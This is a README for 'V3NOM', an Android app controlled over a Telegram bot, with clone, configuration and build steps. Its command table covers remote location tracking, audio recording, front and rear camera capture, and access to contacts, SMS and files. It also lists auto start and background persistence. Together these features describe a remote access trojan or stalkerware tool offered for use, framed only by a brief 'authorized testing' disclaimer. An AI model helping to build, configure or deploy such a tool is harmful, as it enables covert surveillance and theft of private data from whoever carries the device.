# V3NOM

> **Lightweight Android command agent built for authorized device management, security research, and educational testing.**

![Android](https://img.shields.io/badge/Platform-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)
![Java](https://img.shields.io/badge/Language-Java-orange?style=for-the-badge&logo=openjdk&logoColor=white)
![Android Studio](https://img.shields.io/badge/Android%20Studio-3DDC84?style=for-the-badge&logo=androidstudio&logoColor=white)
![Gradle](https://img.shields.io/badge/Gradle-02303A?style=for-the-badge&logo=gradle&logoColor=white)
![Telegram](https://img.shields.io/badge/API-Telegram-26A5E4?style=for-the-badge&logo=telegram&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-blue?style=for-the-badge)

---

## Overview

V3NOM is a lightweight Android Studio project demonstrating a modular command-based architecture for Android applications. It is intended for Android development practice, background service implementation, and Telegram Bot integration in authorized environments.

## Features

- 📱 Device Status
- 📍 Location
- 🎙️ microphone 
- 📷 Camera front/back
- 👥 Contacts
- 💬 SMS
- 📂 File Manager
- 🔄 Foreground Service
- 🚀 Auto Start
- ⚡ Background Service

## Requirements

- Android Studio
- Java
- Android SDK
- Gradle
- Telegram Bot Token
- Telegram Chat ID

## Installation

```bash
git clone https://github.com/blackhatvenomm/V3NOM.git
```

1. Open in Android Studio.
2. Let Gradle sync.
3. Configure your Telegram Bot credentials.
4. Build the APK.
5. Install on an authorized test device.

## Configuration

```properties
BOT_TOKEN=YOUR_BOT_TOKEN
CHAT_ID=YOUR_CHAT_ID
```
## 📋 Available Commands

| Command | Description |
|---------|-------------|
| `/alive` | Check device availability |
| `/status` | Get device information |
| `/help` | Display available commands |
| `/location` | Retrieve current location |
| `/camera` | Capture image using the rear camera |
| `/frontcam` | Capture image using the front camera |
| `/audio<seconds>` | Record audio for the specified duration (e.g., `/audio20` records for 20 seconds) |
| `/contacts` | Access contacts |
| `/sms` | Access SMS messages |
| `/files` | Browse recent gallery media |
| `/filemn` | Browse files using the file manager |

## Build

```text
Build → Build APK(s)
Build → Generate Signed Bundle / APK
```

## Tech Stack

- Java
- Android SDK
- Android Studio
- Gradle
- Telegram Bot API

## License

MIT License.

## Disclaimer

This project is intended for educational purposes, Android development practice, security research, and authorized testing only. Use it only on devices you own or are explicitly authorized to manage or evaluate.
